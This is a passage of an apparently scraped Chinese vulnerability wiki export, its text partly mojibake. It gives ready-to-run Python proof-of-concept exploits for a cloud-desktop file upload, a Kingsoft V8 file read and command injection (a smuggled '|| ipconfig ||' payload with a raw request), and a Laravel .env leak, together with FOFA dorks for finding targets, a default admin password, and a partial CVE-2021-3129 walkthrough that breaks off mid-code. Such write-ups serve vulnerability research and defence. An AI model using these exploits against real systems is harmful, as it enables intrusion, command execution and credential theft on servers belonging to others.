http://xxx.xx.xxx.xxx/Upload/1/test.php æ¼æ´POC import requests import sys import random import base64 import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: å’Œä¿¡äº‘æ¡Œé¢ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd >>> whoami \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/Upload/upload_file.php?l=test\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\", \"Content-Type\": \"multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv\" } data = base64.b64decode(\"Q29udGVudC1UeXBlOiBtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5ZmNLUmx0R3YKCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWZjS1JsdEd2CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iZmlsZSI7IGZpbGVuYW1lPSJ0ZXN0LnBocCIKQ29udGVudC1UeXBlOiBpbWFnZS9hdmlmCgo8P3BocCBwaHBpbmZvKCk7Pz4KLS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5ZmNLUmx0R3YtLQ==\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if \"Requst\" in response.text and response.status_code == 200: webshell_url = target_url + \"/Upload/test/config.php\" response = requests.get(url=webshell_url, headers=headers,verify=False, timeout=5) if \"shell\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {}å­˜åœ¨æ¼æ´ config.php\\n[o] è·¯å¾„ä¸º {}/Upload/test/config.php\\033[0m\".format(target_url, target_url)) else: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") sys.exit(0) else: print(\"\\033[31m[x] ä¸Šä¼ å¤±è´¥ \\033[0m\") except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 18:16:03 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/è™šæ‹Ÿä»¿çœŸå®éªŒå®¤/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/è™šæ‹Ÿä»¿çœŸå®éªŒå®¤/","title":"è™šæ‹Ÿä»¿çœŸå®éªŒå®¤","keywords":"","body":"è™šæ‹Ÿä»¿çœŸå®éªŒå®¤ é˜¿å°”æ³•ç§‘æŠ€ è™šæ‹Ÿä»¿çœŸå®éªŒå®¤ æœªæˆæƒè®¿é—®æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-02 23:01:43 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/è™šæ‹Ÿä»¿çœŸå®éªŒå®¤/é˜¿å°”æ³•ç§‘æŠ€ è™šæ‹Ÿä»¿çœŸå®éªŒå®¤ æœªæˆæƒè®¿é—®æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/è™šæ‹Ÿä»¿çœŸå®éªŒå®¤/é˜¿å°”æ³•ç§‘æŠ€ è™šæ‹Ÿä»¿çœŸå®éªŒå®¤ æœªæˆæƒè®¿é—®æ¼æ´.html","title":"é˜¿å°”æ³•ç§‘æŠ€ è™šæ‹Ÿä»¿çœŸå®éªŒå®¤ æœªæˆæƒè®¿é—®æ¼æ´","keywords":"","body":"é˜¿å°”æ³•ç§‘æŠ€ è™šæ‹Ÿä»¿çœŸå®éªŒå®¤ æœªæˆæƒè®¿é—®æ¼æ´ æ¼æ´æè¿° é˜¿å°”æ³•ç§‘æŠ€ è™šæ‹Ÿä»¿çœŸå®éªŒå®¤ å­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´ï¼Œé€šè¿‡è®¿é—®æ„é€ çš„Urlå¯ä»¥è·å–æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] è™šæ‹Ÿä»¿çœŸå®éªŒå®¤ FOFA [!NOTE] body=\"æ²³å—é˜¿å°”æ³•ç§‘æŠ€æœ‰é™å…¬å¸\" æ¼æ´å¤ç° æœªæˆæƒçš„Urlä¸º /admin/student/studentlist.html?page=1 æˆåŠŸè·å–æ‰€æœ‰ç”¨æˆ·çš„è´¦å·å¯†ç ä¿¡æ¯ å‚è€ƒæ–‡ç«  http://www.0dayhack.net/index.php/1702/ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/é‡‘å±±/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/é‡‘å±±/","title":"é‡‘å±±","keywords":"","body":"é‡‘å±± é‡‘å±± V8 ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ é»˜è®¤å¼±å£ä»¤æ¼æ´ é‡‘å±± V8 ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ é‡‘å±± V8 ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ pdf_maker.php å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-21 22:22:56 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/é‡‘å±±/é‡‘å±± V8 ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ é»˜è®¤å¼±å£ä»¤æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/é‡‘å±±/é‡‘å±± V8 ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ é»˜è®¤å¼±å£ä»¤æ¼æ´.html","title":"é‡‘å±± V8 ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ é»˜è®¤å¼±å£ä»¤æ¼æ´","keywords":"","body":"é‡‘å±± V8 ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ é»˜è®¤å¼±å£ä»¤æ¼æ´ æ¼æ´æè¿° é‡‘å±± V8 ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ å­˜åœ¨é»˜è®¤å¼±å£ä»¤ï¼Œæ”»å‡»è€…å¯ä»¥è·å¾—å…¨éƒ¨ä¸»æœºæƒé™ æ¼æ´å½±å“ [!NOTE] é‡‘å±± V8 ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ FOFA [!NOTE] app=\"çŒé¹°å®‰å…¨-é‡‘å±±V8+ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ\" æ¼æ´å¤ç° ç™»é™†é¡µé¢å¦‚ä¸‹ é»˜è®¤å£ä»¤ä¸º admin/admin ç™»å½•åè·å–å…¨éƒ¨çš„ä¸»æœºæƒé™(åŒ…æ‹¬è¿›ç¨‹æŸ¥çœ‹ï¼Œå‘½ä»¤æ‰§è¡Œç­‰) Goby & POC [!NOTE] Kingsoft V8 Default weak password PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/é‡‘å±±/é‡‘å±± V8 ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/é‡‘å±±/é‡‘å±± V8 ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´.html","title":"é‡‘å±± V8 ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´","keywords":"","body":"é‡‘å±± V8 ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ æ¼æ´æè¿° é‡‘å±± V8 ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ¼æ´ä¸‹è½½æœåŠ¡å™¨ä»»æ„æ–‡ä»¶ æ¼æ´å½±å“ [!NOTE] é‡‘å±± V8 ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ FOFA [!NOTE] title=\"åœ¨çº¿å®‰è£…-V8+ç»ˆç«¯å®‰å…¨ç³»ç»ŸWebæ§åˆ¶å°\" æ¼æ´å¤ç° å­˜åœ¨æ¼æ´çš„æ–‡ä»¶ /Console/htmltopdf/downfile.php æ–‡ä»¶ä¸­æ²¡æœ‰ä»»ä½•çš„è¿‡æ»¤ é€šè¿‡filenameå‚æ•°å³å¯ä¸‹è½½ä»»æ„æ–‡ä»¶ POCä¸º http://xxx.xxx.xxx.xxx/htmltopdf/downfile.php?filename=downfile.php æ¼æ´POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mTitle : é‡‘å±± V8 ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/htmltopdf/downfile.php?filename=downfile.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"$filename\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {} å­˜åœ¨æ¼æ´ , å“åº”ä¸º:\\n{} \\033[0m\".format(target_url, response.text)) else: print(\"\\033[31m[x] ä¸å­˜åœ¨æ¼æ´ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] Kingsoft V8 Arbitrary file read PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/é‡‘å±±/é‡‘å±± V8 ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ pdf_maker.php å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/é‡‘å±±/é‡‘å±± V8 ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ pdf_maker.php å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"é‡‘å±± V8 ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ pdf_maker.php å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"é‡‘å±± V8 ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ pdf_maker.php å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° é‡‘å±± V8 ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ pdf_maker.php å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œç”±äºæ²¡æœ‰è¿‡æ»¤å±é™©å­—ç¬¦ï¼Œå¯¼è‡´æ„é€ ç‰¹æ®Šå­—ç¬¦å³å¯è¿›è¡Œå‘½ä»¤æ‹¼æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ æ¼æ´å½±å“ [!NOTE] é‡‘å±± V8 ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ FOFA [!NOTE] app=\"çŒé¹°å®‰å…¨-é‡‘å±±V8+ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ\" æ¼æ´å¤ç° å­˜åœ¨æ¼æ´çš„æ–‡ä»¶ä¸º Kingsoft\\Security Manager\\SystemCenter\\Console\\inter\\pdf_maker.php array(\"set_exportpdf_cmd\"=>array( \"url\"=>\"http://172.18.254.146/report/system/main.php?userSession=5784727B-7AEA-4EFE-B0CB-DDD6DA1CABD3&guid=1AC380D9-580C-49A8-B6EC-787CF50FA928&VHierarchyID=ADMIN\", \"fileName\"=>\"test1234.pdf\" ) )); */ $url = $_POST[\"url\"]; $fileName = $_POST[\"fileName\"]; $batName=$fileName; if ($url == null || $fileName == null) { $return[\"nResult\"] = __LINE__; echo json_encode($return,JSON_UNESCAPED_UNICODE); return ; } $url = base64_decode($url); $nameStr = base64_decode($fileName).date(\"Y-m-d\").\".pdf\"; $fileName=\"..\\\\htmltopdf\\\\\".$nameStr; system('mkdir ..\\\\htmltopdf'); $cmd = '..\\\\..\\\\wkhtmltopdf.exe \"'.$url.'\" '.$fileName; if (getApacheVersion()>=24) { //apache 2.4 php 7 ç‰ˆæœ¬ åªèƒ½åœ¨ batä¸­è¿è¡Œ $cmd =\" del \".$fileName; exec($cmd); $url_= str_replace('%','%%', $url); $cmd = '..\\\\..\\\\wkhtmltopdf.exe \"'.$url_.'\" '.$fileName; $batName =\"exec_wkhtmltopdf.bat\"; $myfile = fopen($batName , \"w\"); //$cmd =iconv(\"UTF-8\", \"gbk\", $cmd ); fwrite($myfile, $cmd); fclose($myfile); $cmd =$batName ; exec($cmd); $cmd =\" del \".$batName; exec($cmd); }else { system($cmd); } // echo $url; $return = array(\"nResult\" => \"0\",\"fileName\" =>$nameStr,\"url\"=>$url); echo json_encode($return,JSON_UNESCAPED_UNICODE); ?> è¿™é‡Œä¼ å…¥ base64åŠ å¯†çš„æ‹¼æ¥å‘½ä»¤å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤ \"|| ipconfig || --base64--> url=IiB8fCBpcGNvbmZpZyB8fA==&fileName=xxx POST /inter/pdf_maker.php HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 45 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: PHPSESSID=noei1ghcv9rqgp58jf79991n04 url=IiB8fCBpcGNvbmZpZyB8fA%3D%3D&fileName=xxx æ¼æ´POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mTitle : é‡‘å±± V8 ç»ˆç«¯å®‰å…¨ç³»ç»Ÿ pdf_maker.php å‘½ä»¤æ‰§è¡Œæ¼æ´ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/inter/pdf_maker.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"url=IiB8fCBpcGNvbmZpZyB8fA==&fileName=xxx\" try: response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if \"Windows\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {} å­˜åœ¨æ¼æ´ ,æ‰§è¡Œ ipconfig, å“åº”ä¸º:\\n{} \\033[0m\".format(target_url, response.text)) else: print(\"\\033[31m[x] ä¸å­˜åœ¨æ¼æ´ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] Kingsoft V8 pdf_maker.php RCE PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/å¼€å‘æ¡†æ¶æ¼æ´/":{"url":"PeiQi_Wiki/å¼€å‘æ¡†æ¶æ¼æ´/","title":"å¼€å‘æ¡†æ¶æ¼æ´","keywords":"","body":"å¼€å‘æ¡†æ¶æ¼æ´ğŸ‡ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/å¼€å‘æ¡†æ¶æ¼æ´/Laravel/":{"url":"PeiQi_Wiki/å¼€å‘æ¡†æ¶æ¼æ´/Laravel/","title":"Laravel","keywords":"","body":"Laravel Laravel .env é…ç½®æ–‡ä»¶æ³„éœ² CVE-2017-16894 Laravel PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-24 12:32:59 "},"PeiQi_Wiki/å¼€å‘æ¡†æ¶æ¼æ´/Laravel/Laravel .env é…ç½®æ–‡ä»¶æ³„éœ² CVE-2017-16894.html":{"url":"PeiQi_Wiki/å¼€å‘æ¡†æ¶æ¼æ´/Laravel/Laravel .env é…ç½®æ–‡ä»¶æ³„éœ² CVE-2017-16894.html","title":"Laravel .env é…ç½®æ–‡ä»¶æ³„éœ² CVE-2017-16894","keywords":"","body":"Laravel .env é…ç½®æ–‡ä»¶æ³„éœ² CVE-2017-16894 æ¼æ´æè¿° Laravel Frameworkæ˜¯Taylor Otwellè½¯ä»¶å¼€å‘è€…å¼€å‘çš„ä¸€æ¬¾åŸºäºPHPçš„Webåº”ç”¨ç¨‹åºå¼€å‘æ¡†æ¶ã€‚ Laravel framework 5.5.21åŠä¹‹å‰çš„ç‰ˆæœ¬ä¸­å­˜åœ¨ .env æ–‡ä»¶å¯è¢«ä¸‹è½½çš„ä¿¡æ¯æ³„éœ²æ¼æ´ã€‚è¿œç¨‹æ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´è·å–æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] Laravel framework FOFA [!NOTE] app=\"Laravel-Framework\" æ¼æ´å¤ç° è®¿é—®ç›®æ ‡ url http://xxx.xxx.xxx.xxx/.env å½“é…ç½®ä¸å½“ä¸”åœ¨å½±å“èŒƒå›´å†…æ—¶ä¼šå‡ºç° .envå¯è¢«ä¸‹è½½çš„æƒ…å†µï¼Œå¯¼è‡´æ•°æ®åº“è´¦å·å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯çš„æ³„éœ² è¿™é‡Œä½¿ç”¨POCè„šæœ¬æ¥è¿›è¡Œä¿¡æ¯è·å– æ¼æ´åˆ©ç”¨POC import requests import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Laravel framework >> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/.env\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"APP_NAME\" in response.text: print(\"\\033[32m[o] ç›®æ ‡{}å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url)) print(\"\\033[32m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] .env æ–‡ä»¶è¯·æ±‚å¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ Laravel.env_configuration_file_leaks(CVE-2017-16894).json PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/å¼€å‘æ¡†æ¶æ¼æ´/Laravel/Laravel å°äº 8.4.2 Debugæ¨¡å¼ _ignition è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-3129.html":{"url":"PeiQi_Wiki/å¼€å‘æ¡†æ¶æ¼æ´/Laravel/Laravel å°äº 8.4.2 Debugæ¨¡å¼ _ignition è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-3129.html","title":"Laravel å°äº 8.4.2 Debugæ¨¡å¼ _ignition è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-3129","keywords":"","body":"Laravel æ¼æ´æè¿° Laravel æ˜¯ä¸€ä¸ªå…è´¹çš„å¼€æº PHP Web æ¡†æ¶ï¼Œæ—¨åœ¨å®ç°çš„Webè½¯ä»¶çš„MVCæ¶æ„ã€‚2021å¹´1æœˆ13æ—¥ï¼Œé˜¿é‡Œäº‘åº”æ€¥å“åº”ä¸­å¿ƒç›‘æ§åˆ°å›½å¤–æŸå®‰å…¨ç ”ç©¶å›¢é˜ŸæŠ«éœ²äº† Laravel æ¼æ´å½±å“ [!NOTE] Laravel æ¡†æ¶ facade ignition ç»„ä»¶ ç¯å¢ƒæ­å»º https://github.com/SNCKER/CVE-2021-3129.git docker-compose up -d ç‚¹å‡»ç”Ÿæˆå¯†é’¥å‡ºç°å¦‚ä¸‹å›¾å³æˆåŠŸåˆ›å»ºæ¼æ´ç¯å¢ƒ æ¼æ´å¤ç° æŒ‰ç…§æ¼æ´å…¬å¼€æ–‡ç« éœ€è¦å…ˆæœ‰ä¸€ä¸ªæœªçŸ¥å˜é‡çš„é”™è¯¯ï¼Œæ¥ç‚¹å‡» Make variable optional [!NOTE] æŒ‰ç…§å®˜æ–¹æ‰‹å†Œåˆ›å»ºè·¯ç”±å’ŒViewæ¨¡æ¿ é€šè¿‡ç‚¹å‡»â€œMake variableOptionalâ€æŒ‰é’®ï¼Œæ¨¡æ¿å˜é‡åˆ™ä¼šè¢«ä¿®æ”¹ã€‚å¦‚æœæ£€æŸ¥HTTPæ—¥å¿—ï¼Œæˆ‘ä»¬å°±ä¼šçœ‹åˆ°è¢«è°ƒç”¨çš„ç«¯ç‚¹ é€šè¿‡è¿™äº›solutionsï¼Œå¼€å‘è€…å¯ä»¥é€šè¿‡ç‚¹å‡»æŒ‰é’®çš„æ–¹å¼ï¼Œå¿«é€Ÿä¿®å¤ä¸€äº›é”™è¯¯ã€‚æœ¬æ¬¡æ¼æ´å°±æ˜¯å…¶ä¸­çš„vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.phpè¿‡æ»¤ä¸ä¸¥è°¨å¯¼è‡´çš„ã€‚é¦–å…ˆæˆ‘ä»¬åˆ°æ‰§è¡Œsolutionçš„æ§åˆ¶å™¨å½“ä¸­å»ï¼Œçœ‹çœ‹æ˜¯å¦‚ä½•è°ƒç”¨åˆ°solutionçš„ getRunnableSolution(); $solution->run($request->get('parameters', [])); return response(''); } } æ¥ç€è°ƒç”¨solutionå¯¹è±¡ä¸­çš„run()æ–¹æ³•ï¼Œå¹¶å°†å¯æ§çš„parameterså‚æ•°ä¼ è¿‡å»ã€‚é€šè¿‡è¿™ä¸ªç‚¹æˆ‘ä»¬å¯ä»¥è°ƒç”¨åˆ°MakeViewVariableOptionalSolution::run() makeOptional($parameters); if ($output !== false) { file_put_contents($parameters['viewFile'], $output); } } public function makeOptional(array $parameters = []) { $originalContents = file_get_contents($parameters['viewFile']); $newContents = str_replace('$'.$parameters['variableName'], '$'.$parameters['variableName'].\" ?? ''\", $originalContents); $originalTokens = token_get_all(Blade::compileString($originalContents)); $newTokens = token_get_all(Blade::compileString($newContents)); $expectedTokens = $this->generateExpectedTokens($originalTokens, $parameters['variableName']); if ($expectedTokens !== $newTokens) { return false; } return $newContents; } protected function generateExpectedTokens(array $originalTokens, string $variableName): array { $expectedTokens = []; foreach ($originalTokens as $token) { $expectedTokens[] = $token; if ($token[0] === T_VARIABLE && $token[1] === '$'.$variableName) { $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]]; $expectedTokens[] = [T_COALESCE, '??', $token[2]]; $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]]; $expectedTokens[] = [T_CONSTANT_ENCAPSED_STRING, \"''\", $token[2]]; } } return $expectedTokens; } } å¯ä»¥çœ‹åˆ°è¿™é‡Œä¸»è¦åŠŸèƒ½ç‚¹æ˜¯ï¼šè¯»å–ä¸€ä¸ªç»™å®šçš„è·¯å¾„ï¼Œå¹¶æ›¿æ¢$variableNameä¸º$variableName ?? ''ï¼Œä¹‹åå†™å›æ–‡ä»¶ä¸­ã€‚ç”±äºè¿™é‡Œè°ƒç”¨äº†file_get_contents()ï¼Œä¸”å…¶ä¸­çš„å‚æ•°å¯æ§ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥é€šè¿‡phar://åè®®å»è§¦å‘pharååºåˆ—åŒ–ã€‚å¦‚æœåæœŸåˆ©ç”¨æ¡†æ¶è¿›è¡Œå¼€å‘çš„äººå‘˜ï¼Œå†™å‡ºäº†ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä¸Šä¼ ä¸€ä¸ªæ¶æ„pharæ–‡ä»¶ï¼Œåˆ©ç”¨ä¸Šè¿°çš„file_get_contents()å»è§¦å‘pharååºåˆ—åŒ–ï¼Œè¾¾åˆ°rceçš„æ•ˆæœã€‚ é™¤äº†è§£å†³æ–¹æ¡ˆçš„ç±»åä¹‹å¤–ï¼Œè¿˜å‘é€äº†ä¸€ä¸ªæ–‡ä»¶è·¯å¾„å’Œä¸€ä¸ªæˆ‘ä»¬è¦æ›¿æ¢çš„å˜é‡åã€‚è¿™çœ‹èµ·æ¥éå¸¸è®©äººæ„Ÿå…´è¶£ã€‚ è®©æˆ‘ä»¬å…ˆæ£€æŸ¥ä¸€ä¸‹ç±»åçš„åˆ©ç”¨æ–¹æ³•ï¼šæˆ‘ä»¬å¯ä»¥å®ä¾‹åŒ–ä»»æ„çš„ç±»å—ï¼Ÿ class SolutionProviderRepository implements SolutionProviderRepositoryContract { ... public function getSolutionForClass(string $solutionClass): ?Solution { if (! class_exists($solutionClass)) { return null; } if (! in_array(Solution::class, class_implements($solutionClass))) { return null; } return app($solutionClass); } } ç­”æ¡ˆæ˜¯å¦å®šçš„ï¼šIgnitionæ€»æ˜¯ç”¨æˆ‘ä»¬æŒ‡å‘çš„ç±»æ¥å®ç°RunnableSolution é‚£ä¹ˆï¼Œè®©æˆ‘ä»¬ä»”ç»†çœ‹çœ‹è¿™ä¸ªç±»ã€‚å®é™…ä¸Šï¼Œè´Ÿè´£è¯¥æ“ä½œçš„ä»£ç ä½./vendor/facade/ignition/sr/solutions/MakeViewVariableOptionalSolution.phpæ–‡ä»¶ä¸­ã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ”¹ä»»æ„æ–‡ä»¶çš„å†…å®¹ä¹ˆï¼Ÿ class MakeViewVariableOptionalSolution implements RunnableSolution { ... public function run(array $parameters = []) { $output = $this->makeOptional($parameters); if ($output !== false) { file_put_contents($parameters['viewFile'], $output); } } public function makeOptional(array $parameters = []) { $originalContents = file_get_contents($parameters['viewFile']); // [1] $newContents = str_replace('$'.$parameters['variableName'], '$'.$parameters['variableName'].\" ?? ''\", $originalContents); $originalTokens = token_get_all(Blade::compileString($originalContents)); // [2] $newTokens = token_get_all(Blade::compileString($newContents)); 